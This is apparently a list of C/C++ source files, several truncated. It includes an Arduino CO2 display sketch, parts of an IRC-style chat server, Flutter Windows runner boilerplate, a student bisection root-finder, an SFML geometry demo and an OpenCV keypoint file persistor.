delay(2000);\n\n    // Retrieve raw CO2 data from the MH-Z19 sensor\n    double adjustedCO2 = myMHZ19.getCO2();\n    // Convert CO2 data to a string\n    String strCO2 = String(adjustedCO2);\n    // Clear the OLED screen for a fresh update\n    display.clear();\n\n    // Display CO2 data at the top of the OLED screen\n    display.drawString(64, 16, \"CO2: \" + strCO2);\n\n    // Update the display on the OLED screen\n    display.display();\n}\n",
    "#include \"../inc/main.hpp\"\n\nssize_t\tsend_user(int socket, const void *buffer, size_t length, int flags)\n{\n    ssize_t totalSentBytes = 0;\n    const char *bufferPtr = (const char*) buffer;\n\n    while (totalSentBytes < static_cast<ssize_t>(length))\n    {\n        ssize_t sentBytes = send(socket, bufferPtr + totalSentBytes, length - totalSentBytes, flags);\n        if (sentBytes == -1)\n        {\n            return -1; // Return -1 on failure, caller will check errno\n        }\n\n        totalSentBytes += sentBytes;\n    }\n\n    return totalSentBytes;\n}\n\nssize_t\tsend_all(server *server, const void *buffer, size_t lenght, int flags, std::string channel)\n{\n\tssize_t totalSentBytes = 0;\n\n\tfor (std::size_t j = 0; j < server->channels[channel]->users.size(); j++)\n\t{\n\t\ttotalSentBytes += send_user(server->channels[channel]->users[j].getSocket(), buffer, lenght, flags);\n\t}\n\treturn (totalSentBytes);\n}\n\nvoid\tget_new_user(server *server, std::vector<pollfd> &fds)\n{\n    int newClientSocket = accept(server->socket_id, NULL, NULL);\n    if (newClientSocket == -1)\n    {\n        std::cerr << \"Can't accept client!\";\n        return;\n    }\n    user newUser(newClientSocket);\n    server->users[newClientSocket] = newUser;\n    pollfd newPfd;\n    newPfd.fd = newClientSocket;\n    newPfd.events = POLLIN;\n    fds.push_back(newPfd);\n    fds[0].revents = 0;\n    send_user(newPfd.fd, \"Welcome to the server!\\n\", 23, 0);\n\tsend_user(newPfd.fd, \"Please enter the server password: /PASS <password>\\r\\n\", 52, 0);\n}\n\nint\tcheck_valid(std::string buffer)\n{\n\tif(buffer.empty())\n\t{\n\t\tstd::cout << \"error 1\\n\";\n\t\treturn (1);\n\t}\n\treturn (0);\n}\n\nvoid    get_username(char *buf, int fd, server *server)\n{\n    std::string buffer(buf);\n\tstd::cout << \"buffer = \" << buffer << std::endl;\n    if (buffer.find(\"USER\") != std::string::npos && (buffer.find(\"USER\") == 0 || buffer[buffer.find(\"USER\") - 1] == '\\n'))\n    {\n        if (server->users[fd].getUsername().empty()) {\n            std::string username = buffer.substr(buffer.find(\"USER\") + 5);\n\t\t\tif(check_valid(username) == 1)\n\t\t\t{\n\t\t\t\tsend_user(fd, \"Please enter a valid username: USER <username>\\n\", 47, 0);\n\t\t\t\treturn ;\n\t\t\t}\n\t\t\twhile(username[username.size() - 1] == ' ' || username[username.size() - 1] == '\\t')\n\t\t\t\tusername = username.substr(0, username.size() - 1);\n\t\t\twhile(username[0] == ' ' || username[0] == '\\t')\n\t\t\t\tusername = username.substr(1);\n            std::size_t endPos = username.find_first_of(\"\\r\\n\");\n            if (endPos != std::string::npos)\n                username = username.substr(0, endPos);\n\t\t\tusername = username.substr(0, username.find(\" \"));\n            server->users[fd].setUsername(username);\n            std::cout << \"Username set to: |\" << username << \"|\\n\";\n            server->users[fd].setStatus(2);\n            std::cout << \"status = \" << server->users[fd].getStatus() << \"\\n\";\n        }\n        else\n            send_user(fd, \"You may not reregister\\n\", 23, 0);\n    }\n    else if(server->users[fd].getUsername().empty())\n        send_user(fd, \"Please enter your username: USER <username>\\n\", 45, 0);\n}\n\nvoid    get_username_hex(char *buf, int fd, server *server)\n{\n\tstd::string buffer(buf);\n\tstd::cout << \"buffer = \" << buffer << std::endl;\n\tif (buffer.find(\"USER\") != std::string::npos && (buffer.find(\"USER\") == 0 || buffer[buffer.find(\"USER\") - 1] == '\\n'))\n\t{\n\t\tif (server->users[fd].getUsername().empty()) {\n\t\t\tstd::string username = buffer.substr(buffer.find(\"USER\") + 5);\n\t\t\tusername = username.substr(0, username.find(\"* :realname\") - 2);\n\t\t\twhile(username[username.size() - 1] == ' ' || username[username.size() - 1] == '\\t')\n\t\t\t\tusername = username.substr(0, username.size() - 1);\n\t\t\tstd::size_t endPos = username.find_first_of(\"\\r\\n\");\n\t\t\tif (endPos != std::string::npos)\n\t\t\t\tusername = username.substr(0, endPos);\n\t\t\tusername = username.substr(0, username.find(\" \"));\n\t\t\tserver->users[fd].setUsername(username);\n\t\t\tstd::cout << \"Username set to: |\" << username << \"|\\n\";\n\t\t\tserver->users[fd].setStatus(1);\n\t\t\tstd::cout << \"status = \" << server->users[fd].getStatus() << \"\\n\";\n\t\t}\n\t\telse\n\t\t\tsend_user(fd, \"You may not reregister\\r\\n\", 23, 0);\n\t}\n}\n\nvoid    get_nickname_hex(char *buf, int fd, server *server)\n{\n\tstd::string buffer(buf);\n\tif (buffer.find(\"NICK\") != std::string::npos && (buffer.find(\"NICK\") == 0 || buffer[buffer.find(\"NICK\") - 1] == '\\n'))\n\t{\n\t\tstd::string oldNick = server->users[fd].getNickname();\n\t\tstd::string nick = buffer.substr(buffer.find(\"NICK\") + 5);\n\t\twhile(nick[nick.size() - 1] == ' ' || nick[nick.size() - 1] == '\\t')\n\t\t\tnick = nick.substr(0, nick.size() - 1);\n\t\tstd::size_t endPos = nick.find_first_of(\"\\r\\n\");\n\t\tif (endPos != std::string::npos)\n\t\t\tnick = nick.substr(0, endPos);\n\t\t// cut by the first space\n\t\tnick = nick.substr(0, nick.find(\" \"));\n\n\t\tif (oldNick.compare(nick) == 0)\n\t\t\treturn ;\n\t\tif (!server->users[fd].getNickname().empty())\n\t\t{\n\t\t\tserver->users[fd].setNickname(nick);\n\t\t\tstd::string message = \":\" + oldNick + \"!\" + server->users[fd].getUsername() + \" NICK \" + server->users[fd",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"strawberry\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                }\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <SFML/Graphics.hpp>\n#include <stdlib.h>\n#include <iostream>\n#include <Windows.h>\n#include <cmath>\n#include <Complex>\n#define PI std::acos(-1)\nusing namespace std;\n\n\nstd::complex<double> makeComplex(sf::Vector2f v) {\n    return std::complex<double>(v.x, v.y);\n}\n\nsf::Vector2f makeVector(std::complex<double> c) {\n    return sf::Vector2f(c.real(), c.imag());\n}\n\n\nint main() {\n    sf::RenderWindow window(sf::VideoMode(1200, 900), \"cirlces\");\n    sf::Vector2u size = window.getSize();\n    sf::View view(sf::Vector2f(0, 0), sf::Vector2f(size.x, size.y));\n    window.setView(view);\n\n    sf::VertexArray lineStrip(sf::LineStrip, 3);\n    lineStrip[0] = sf::Vertex(sf::Vector2f(0, 0));\n    lineStrip[1] = sf::Vertex(sf::Vector2f(0, 300));\n    lineStrip[2] = sf::Vertex(sf::Vector2f(-50, 250));\n\n    sf::VertexArray trace(sf::LineStrip);\n\n    while (window.isOpen())\n    {\n        // check all the window's events that were triggered since the last iteration of the loop\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            // \"close requested\" event: we close the window\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n        }\n\n        auto c0 = makeComplex(lineStrip[0].position);\n        auto c1 = makeComplex(lineStrip[1].position);\n        auto c2 = makeComplex(lineStrip[2].position);\n\n\n        //R(z) = e^(i * theta)(z - z0) + z0\n        c1 = exp(1i * (0.9 * PI / 180)) * c1;\n\n        c2 = exp(1i * (0.9 * PI / 180)) * c2;\n        c2 = exp(1i * (1.3 * PI / 180)) * (c2 - c1) + c1;\n\n        lineStrip[1].position = makeVector(c1);\n        lineStrip[2].position = makeVector(c2);\n\n        trace.append(sf::Vertex(lineStrip[2].position, sf::Color(238, 192, 255, 255)));\n\n        Sleep(1);\n\n        window.clear();\n        window.draw(lineStrip);\n        window.draw(trace);\n        window.display();\n    }\n\n\treturn 0;\n}\n",
    "#include \"VecKeyPointPersistor.h\"\n\n#include <type_traits>\n#include <iostream>\n\n// #include <sys/stat.h>\n// #include <sys/mman.h> \n// #include <fcntl.h>\n#include <stdio.h>\n\nusing namespace std;\nusing namespace cv;\n\nstruct PODKeyPoint {\n    float x;\n    float y;\n    float angle;\n    float size;\n    int octave;\n    float respose;\n};\n\nVecKeyPointPersistor::VecKeyPointPersistor()\n    : /*file(-1),*/ data(nullptr), length(0) {\n}\n\nVecKeyPointPersistor::VecKeyPointPersistor(VecKeyPointPersistor&& o) \n    : file(std::move(o.file)), length(std::move(o.length)), lookup(std::move(o.lookup)), data(std::move(o.data)), keepInMemory(o.keepInMemory) {\n    // o.file = -1;\n    o.data = nullptr;\n}\n\nVecKeyPointPersistor::~VecKeyPointPersistor() {\n    close();\n}\n\nVecKeyPointPersistor& VecKeyPointPersistor::operator = (VecKeyPointPersistor&& o) {\n    file = std::move(o.file); // o.file = -1;\n    lookup = std::move(o.lookup);\n    data = std::move(o.data); o.data = nullptr;\n    length = std::move(o.length); o.length = 0;\n    keepInMemory = o.keepInMemory;\n    return *this;\n}\n\nbool VecKeyPointPersistor::isOpen() {\n    // return file != -1;\n    return file.is_open();\n}\n\nbool VecKeyPointPersistor::exists(const std::string& filename) {\n    FILE *file = fopen(filename.c_str(), \"r\");\n    if (file != nullptr) {\n        fclose(file);\n        return true;\n    }\n    return false;\n}\n\nvoid VecKeyPointPersistor::close() {\n    /*file.release();\n    data.release();*/\n    // if (file != -1) {\n    //     munmap(data, length);\n    //     ::close(file);\n    // }\n    file.close();\n    lookup.clear();\n}\n\nVecKeyPointPersistor VecKeyPointPersistor::open(const std::string& filename, bool keepInMemory) {\n    // int file = ::open(filename.c_str(), O_RDONLY);\n    // if (file < 0) {\n    //     std::cout << \"File does not exist: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecKeyPointPersistor();\n    // }\n    \n    // struct stat s;\n    // int status = fstat(file, &s);\n    // if (file < 0) {\n    //     std::cout << \"Can not read length of file: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecKeyPointPersistor();\n    // }\n\n    /*char* data = nullptr;\n    if (keepInMemory) {\n        fseek(file, 0, SEEK_END);\n        size_t fsize = ftell(file);\n        fseek(file, 0, SEEK_SET);\n\n        data = (char*)malloc(fsize + 1);\n        size_t ret = fread(data, 1, fsize, file);\n        assert(ret > 0);\n    }*/\n    keepInMemory = true;\n    boost::iostreams::mapped_file_source file;\n    file.open(filename);\n\n    if (!file.is_open()) {\n        std::cout << \"File does not exist: \" << filename << std::endl;\n        exit(-1);\n        return VecKeyPointPersistor();\n    }\n\n    char* data = (char*)file.data();\n\n    // char* data = (char*)mmap(0, (size_t)s.st_size, PROT_READ, MAP_PRIVATE, file, 0);\n    // if (data == MAP_FAILED) {\n    //     std::cout << \"Can not map file: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecKeyPointPersistor();\n    // }\n\n    VecKeyPointPersistor pers;\n    pers.file = file;\n    pers.length = file.size(); // s.st_size;\n    pers.data = data;\n    pers.keepInMemory = keepInMemory;\n\n    int ret;\n    size_t descriptorCount = *reinterpret_cast<size_t*>(&data[0]);\n    //fseek(file, 0, SEEK_SET);\n    /*ret = fread(static_cast<void*>(&descriptorCount), 1, sizeof(descriptorCount), pers.file.get());\n    assert(ret == sizeof(descriptorCount));\n    std::vector<DescriptorHeader> descriptors;\n    descriptors.resize(descriptorCount);\n    ret = fread(static_cast<void*>(&descriptors[0]), 1, sizeof(decltype(descriptors)::value_type) * descriptorCount, pers.file.get());\n    assert(ret == sizeof(decltype(descriptors)::value_type) * descriptorCount);*/\n\n    for (size_t i = 0; i < descriptorCount; ++i) {\n        DescriptorHeader descriptor = *reinterpret_cast<DescriptorHeader*>(&data[sizeof(descriptorCount) + i * sizeof(DescriptorHeader)]);\n        pers.lookup[descriptor.frame] = std::make_tuple(descriptor.offset, descriptor.count);\n    }\n\n    return pers;\n}\n\nbool VecKeyPointPersistor::create(const std::string& filename, const std::vector<std::pair<std::vector<cv::KeyPoint>, uint32_t>>& frames) {\n    constexpr size_t KEYPOINT_SIZE = sizeof(((KeyPoint*)0)->pt.x)   +\n                                     sizeof(((KeyPoint*)0)->pt.y)   +\n                                     sizeof(((KeyPoint*)0)->angle)  +\n                                     sizeof(((KeyPoint*)0)->size)   +\n                                     sizeof(((KeyPoint*)0)->octave) +\n                                     sizeof(((KeyPoint*)0)->response);\n    static_assert(sizeof(PODKeyPoint) == KEYPOINT_SIZE, \"The stored keypoint must have the same size as the original one!\");\n\n    FILE* file = fopen(filename.c_str(), \"wb\");\n    if (file == nullptr) {\n        return false;\n    }\n\n    size_t offset = sizeof(DescriptorHeader) * frames.size() + sizeof(size_t);\n    std::vector<DescriptorHeader> descriptors;\n    std::vector<cv::Mat> mats;\n\n    for(size_t i = 0; i ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"client\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 